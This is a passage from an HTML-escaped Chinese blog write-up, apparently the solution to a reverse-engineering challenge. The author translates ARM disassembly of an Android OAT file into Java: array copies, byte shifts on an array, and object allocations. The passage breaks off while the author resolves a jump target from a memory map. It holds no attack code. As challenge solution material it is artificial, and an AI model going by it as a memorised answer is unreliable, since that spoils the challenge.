#20]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b28: f8d0e028    ldr.w   lr, [r0, #40]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b2c: 4641        mov     r1, r8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b2e: 2200        movs    r2, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b30: 1c2b        mov     r3, r5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    0x00216b32: 47f0        blx     lr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;和上面的代码对比，不难发现执行的即为&lt;code&gt;java.lang.System.arraycopy&lt;/code&gt;函数，因此前面汇编代码对应的Java源码为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;System.arraycopy(s1, 0, d1, 0, s1.length);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;继续下一段：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x003720cc: f8da8008    ldr.w   r8, [r10, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720d0: 68b8        ldr     r0, [r7, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720d2: 2600        movs    r6, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720d4: 9016        str     r0, [sp, #88]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720d6: 9800        ldr     r0, [sp, #0]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720d8: 9a16        ldr     r2, [sp, #88]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720da: f8cd8010    str.w   r8, [sp, #16]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720de: 68c0        ldr     r0, [r0, #12]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720e0: f24f0cd8    movw    r12, #61656&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720e4: f850000c    ldr.w   r0, [r0, r12]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720e8: 9205        str     r2, [sp, #20]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720ea: f8d0e028    ldr.w   lr, [r0, #40]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720ee: 9b0a        ldr     r3, [sp, #40]   //  r3为o1数组对象&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720f0: 1c39        mov     r1, r7          //  r1为b2数组对象  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720f2: 1c32        mov     r2, r6          //  r2为0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720f4: 47f0        blx     lr              // 跳转System.arraycopy函数&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;对应的Java源码为：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;System.arraycopy(s2, 0, d1, s2.length, s2.length);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;继续下一段：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x003720f6: 980e        ldr     r0, [sp, #56]       // r0为s3数组对象&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720f8: 2604        movs    r6, #4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720fa: f04f0804    mov.w   r8, #4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003720fe: 6881        ldr     r1, [r0, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372100: 2904        cmp     r1, #4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372102: f24081c0    bls.w   +896 (0x00372486)   // 对s3数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372106: f9908010    ldrsb.w r8, [r0, #16]       // r8 = s3[4]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037210a: 6882        ldr     r2, [r0, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037210c: f1b80831    subs    r8, r8, #49         // r8 = s3[4] - 49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372110: f3480807    UNKNOWN 52                  // SBFX.W    R8, R8, #0, #8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372114: 2a04        cmp     r2, #4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372116: f24081ba    bls.w   +884 (0x0037248e)   // 对s3数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037211a: f8808010    strb    r8, [r0,#16]        // s3[4] = s3[4] - 49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037211e: 6883        ldr     r3, [r0, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372120: 2603        movs    r6, #3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372122: f04f0803    mov.w   r8, #3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372126: 2b03        cmp     r3, #3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372128: f24081b6    bls.w   +876 (0x00372498)   // 对s3数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037212c: f990800f    ldrsb.w r8, [r0, #15]       // r8 = s3[3]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372130: f8d0c008    ldr.w   r12, [r0, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372134: f118082f    adds    r8, r8, #47         // r8 = s3[3] + 47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372138: f3480807    UNKNOWN 52                  // SBFX.W    R8, R8, #0, #8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037213c: f1bc0f03    cmp.w   r12, #3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372140: f24081af    bls.w   +862 (0x003724a2)   // 对s3数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372144: f880800f    strb    r8, [r0,#15]        // s3[3] = s3[3] + 47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372148: 6881        ldr     r1, [r0, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037214a: 2602        movs    r6, #2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037214c: f04f0802    mov.w   r8, #2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372150: 2902        cmp     r1, #2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372152: f24081ab    bls.w   +854 (0x003724ac)   // 对s3数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372156: f990800e    ldrsb.w r8, [r0, #14]       // r8 = s3[2]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037215a: 6882        ldr     r2, [r0, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037215c: f118082a    adds    r8, r8, #42         // r8 = s3[2] + 42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372160: f3480807    UNKNOWN 52                  // SBFX.W    R8, R8, #0, #8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372164: 2a02        cmp     r2, #2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372166: f24081a5    bls.w   +842 (0x003724b4)   // 对s3数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037216a: f880800e    strb    r8, [r0,#14]        // s3[2] = s3[2] + 42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037216e: 6883        ldr     r3, [r0, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372170: 2601        movs    r6, #1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372172: f04f0801    mov.w   r8, #1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372176: 2b01        cmp     r3, #1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372178: f24081a1    bls.w   +834 (0x003724be)   // 对s3数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037217c: f990800d    ldrsb.w r8, [r0, #13]       // r8 = s3[1]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372180: f8d0c008    ldr.w   r12, [r0, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372184: f1b80822    subs    r8, r8, #34         // r8 = s3[1] - 34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372188: f3480807    UNKNOWN 52                  // SBFX.W    R8, R8, #0, #8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037218c: f1bc0f01    cmp.w   r12, #1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372190: f240819a    bls.w   +820 (0x003724c8)   // 对s3数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372194: f880800d    strb    r8, [r0,#13]        // s3[1] = s3[1] - 34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x00372198: 6881        ldr     r1, [r0, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037219a: 2600        movs    r6, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x0037219c: f04f0800    mov.w   r8, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721a0: 2900        cmp     r1, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721a2: f0008196    beq.w   +812 (0x003724d2)   // 对s3数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721a6: f990800c    ldrsb.w r8, [r0, #12]       // r8 = s3[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721aa: 6882        ldr     r2, [r0, #8]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721ac: f118082e    adds    r8, r8, #46         // r8 = s3[0] + 46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721b0: f3480807    UNKNOWN 52                  // SBFX.W    R8, R8, #0, #8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721b4: 2a00        cmp     r2, #0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721b6: f0008190    beq.w   +800 (0x003724da)   // 对s3数组进行边界判断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721ba: 9900        ldr     r1, [sp, #0]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721bc: f880800c    strb    r8, [r0,#12]        // s3[0] = s3[0] + 46&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;对应的Java源码为：&lt;br&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;s3[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;] = (&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;) (s3[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;] - &lt;span class=&quot;number&quot;&gt;49&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;s3[&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;] = (&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;) (s3[&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;] + &lt;span class=&quot;number&quot;&gt;47&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;s3[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;] = (&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;) (s3[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;] + &lt;span class=&quot;number&quot;&gt;42&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;s3[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] = (&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;) (s3[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] - &lt;span class=&quot;number&quot;&gt;34&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;s3[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] = (&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;) (s3[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] + &lt;span class=&quot;number&quot;&gt;46&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;继续下一段：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x003721c0: f8d9e12c    ldr.w   lr, [r9, #300]  ; pAllocObjectInitialized&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721c4: f64b10e0    movw    r0, #47584&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721c8: f2c70049    movt    r0, #28745&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721cc: 47f0        blx     lr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其中pAllocObjectInitialized是初始化一个对象，类型通过r0确定，我们在整个文件搜索&lt;code&gt;movw    r0, #47584&lt;/code&gt;和&lt;code&gt;movt    r0, #28745&lt;/code&gt;，从而确定了此处对应的dalvik字节码为&lt;code&gt;new-instance v0, java.lang.StringBuilder&lt;/code&gt;。&lt;br&gt;继续下一段：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x003721ce: f8d9e12c    ldr.w   lr, [r9, #300]  ; pAllocObjectInitialized&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721d2: 9900        ldr     r1, [sp, #0]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721d4: 9012        str     r0, [sp, #72]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721d6: f64b00f0    movw    r0, #47344&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721da: f2c7003e    movt    r0, #28734&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721de: 47f0        blx     lr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;同样的方法，此处对应的dalvik字节码为&lt;code&gt;new-instance v1, java.lang.String&lt;/code&gt;。&lt;br&gt;继续下一段：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0x003721e0: 9a0e        ldr     r2, [sp, #56]   // r2为s3数组对象&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721e2: 1c06        mov     r6, r0          // r6为上面新建的String对象&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721e4: f2461ef9    movw    lr, #25081  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721e8: f2c72ea0    movt    lr, #29344&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721ec: f64300b0    movw    r0, #14512&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721f0: f2c70044    movt    r0, #28740&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721f4: 1c31        mov     r1, r6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0x003721f6: 47f0        blx     lr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里遇到一个问题，在整个文件中并没有找到匹配的地方，无法得知这里跳转到哪里。我们来计算下lr的值，通过&lt;code&gt;movw    lr, #25081&lt;/code&gt;和&lt;code&gt;movt    lr, #29344&lt;/code&gt;计算得到lr的值为0x72a061F9，也就是说这里跳转到了0x72a061F9这个地址。那么0x72a061F9这里又是什么呢？注意题目一共给我们提供了三个文件，到目前为止我们只用了b文件，a文件提供了内存布局信息，看a文件中的下面一段信息：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;70eee000-7298b000 r--p 00000000 b3:17 185109     /data/dalvik-cache/arm/system@framework@boot.oat&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7298b000-73e43000 r-xp 01a9d000 b3:17 185109     /data/dalvik-cache/arm/system@framework@boot.oat&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73e43000-73e44000 rw-p 02f55000 b3:17 185109     /data/dalvik-cache/arm/system@framework@boot.oat&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
